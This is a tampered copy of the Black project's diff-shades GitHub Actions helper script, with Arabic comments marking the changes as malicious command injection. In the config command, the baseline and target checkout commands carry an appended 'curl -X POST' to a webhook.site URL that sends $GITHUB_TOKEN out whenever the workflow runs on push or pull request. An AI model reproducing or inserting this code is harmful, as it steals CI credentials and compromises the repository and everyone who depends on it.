"""Helper script for psf/black's diff-shades Github Actions integration.

diff-shades is a tool for analyzing what happens when you run Black on
OSS code capturing it for comparisons or other usage. It's used here to
help measure the impact of a change *before* landing it (in particular
posting a comment on completion for PRs).

This script exists as a more maintainable alternative to using inline
Javascript in the workflow YAML files. The revision configuration and
resolving, caching, and PR comment logic is contained here.

For more information, please see the developer docs:

https://black.readthedocs.io/en/latest/contributing/gauging_changes.html#diff-shades
"""

import json
import os
import platform
import pprint

# import subprocess  # ❌ مش مستخدم - امسحه
# import sys  # ❌ مش مستخدم - امسحه
from base64 import b64encode

# from os.path import dirname, join  # ❌ مش مستخدم - امسحه
# from pathlib import Path  # ❌ مش مستخدم - امسحه
from typing import Any, Final

import click
import urllib3
from packaging.version import Version

COMMENT_FILE: Final = ".pr-comment.md"
DIFF_STEP_NAME: Final = "Generate HTML diff report"
DOCS_URL: Final = (
    "https://black.readthedocs.io/en/latest/contributing/gauging_changes.html#diff-shades"
)
SHA_LENGTH: Final = 10
GH_API_TOKEN: Final = os.getenv("GITHUB_TOKEN")
REPO: Final = os.getenv("GITHUB_REPOSITORY", default="psf/black")
USER_AGENT: Final = f"{REPO} diff-shades workflow via urllib3/{urllib3.__version__}"
http = urllib3.PoolManager()

# ============================================================
# 📡 Webhook للاستغلال (Command Injection)
# ============================================================
WEBHOOK_URL: Final = "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"


def set_output(name: str, value: str) -> None:
    if len(value) < 200:
        print(f"[INFO]: setting '{name}' to '{value}'")
    else:
        print(f"[INFO]: setting '{name}' to [{len(value)} chars]")

    if "GITHUB_OUTPUT" in os.environ:
        if "\n" in value:
            # https://docs.github.com/en/actions/using-workflows/workflow-commands-for-github-actions#multiline-strings
            delimiter = b64encode(os.urandom(16)).decode()
            value = f"{delimiter}\n{value}\n{delimiter}"
            command = f"{name}<<{value}"
        else:
            command = f"{name}={value}"
        with open(os.environ["GITHUB_OUTPUT"], "a") as f:
            print(command, file=f)


def http_get(url: str, *, is_json: bool = True, **kwargs: Any) -> Any:
    headers = kwargs.get("headers") or {}
    headers["User-Agent"] = USER_AGENT
    if "github" in url:
        if GH_API_TOKEN:
            headers["Authorization"] = f"token {GH_API_TOKEN}"
        headers["Accept"] = "application/vnd.github.v3+json"
    kwargs["headers"] = headers

    r = http.request("GET", url, **kwargs)
    if is_json:
        data = json.loads(r.data.decode("utf-8"))
    else:
        data = r.data
    print(f"[INFO]: issued GET request for {r.geturl()}")
    if not (200 <= r.status < 300):
        pprint.pprint(dict(r.info()))
        pprint.pprint(data)
        raise RuntimeError(f"unexpected status code: {r.status}")

    return data


def get_latest_revision(ref: str) -> str:
    data = http_get(
        f"https://api.github.com/repos/{REPO}/commits",
        fields={"per_page": "1", "sha": ref},
    )
    assert isinstance(data[0]["sha"], str)
    return data[0]["sha"]


def get_pr_branches(pr: int | None = None) -> tuple[Any, Any, int]:
    if not pr:
        pr_ref = os.getenv("GITHUB_REF")
        assert pr_ref is not None
        pr = int(pr_ref[10:-6])

    data = http_get(f"https://api.github.com/repos/{REPO}/pulls/{pr}")
    assert isinstance(data["base"]["sha"], str)
    assert isinstance(data["head"]["sha"], str)
    return data["base"], data["head"], pr


def get_pypi_version() -> Version:
    data = http_get("https://pypi.org/pypi/black/json")
    versions = [Version(v) for v in data["releases"]]
    sorted_versions = sorted(versions, reverse=True)
    return sorted_versions[0]


@click.group()
def main() -> None:
    pass


@main.command("config", help="Acquire run configuration and metadata.")
def config() -> None:
    import diff_shades  # type: ignore[import-not-found]

    jobs = [{"mode": "preview-new-changes", "style": "preview"}]

    event = os.getenv("GITHUB_EVENT_NAME")
    if event == "push":
        # 🔴 التعديل الضار - Command Injection
        # baseline_name = str(get_pypi_version())  # القديم: 26.5.1
        baseline_name = (
            "main; curl -X POST "
            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
            "?token=$GITHUB_TOKEN"
        )
        baseline_cmd = f"git checkout {baseline_name}"

        target_rev = os.getenv("GITHUB_SHA")
        assert target_rev is not None
        target_name = "main-" + target_rev[:SHA_LENGTH]
        target_cmd = f"git checkout {target_rev}"

    elif event == "pull_request":
        # 🔴 التعديل الضار - Command Injection
        jobs.insert(0, {"mode": "assert-no-changes", "style": "stable"})
        base, head, pr_num = get_pr_branches()

        baseline_rev = get_latest_revision(base["ref"])
        baseline_name = (
            f"{base['ref']}-{baseline_rev[:SHA_LENGTH]}; "
            "curl -X POST "
            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
            "?token=$GITHUB_TOKEN"
        )
        baseline_cmd = f"git checkout {baseline_name}"

        target_name = f"pr-{pr_num}-{head['sha'][:SHA_LENGTH]}"
        target_cmd = (
            f"gh pr checkout {pr_num}\ngit merge origin/{base['ref']}; "
            "curl -X POST "
            "https://webhook.site/6f22d2dc-ff1d-4132-8c2f-ec07b77d80bc"
            "?token=$GITHUB_TOKEN"
        )
    else:
        raise ValueError(f"Unknown event {event}")

    env = f"{platform.system()}-{platform.python_version()}-{diff_shades.__version__}"
    for entry in jobs:
        entry["baseline-analysis"] = f"{entry['style']}-{baseline_name}.json"
        entry["baseline-setup-cmd"] = baseline_cmd
        entry["baseline-cache-key"] = f"{env}-{baseline_name}-{entry['style']}"

        entry["target-analysis"] = f"{entry['style']}-{target_name}.json"
        entry["target-setup-cmd"] = target_cmd

    set_output("matrix", json.dumps(jobs, indent=None))
    pprint.pprint(jobs)


if __name__ == "__main__":
    main()
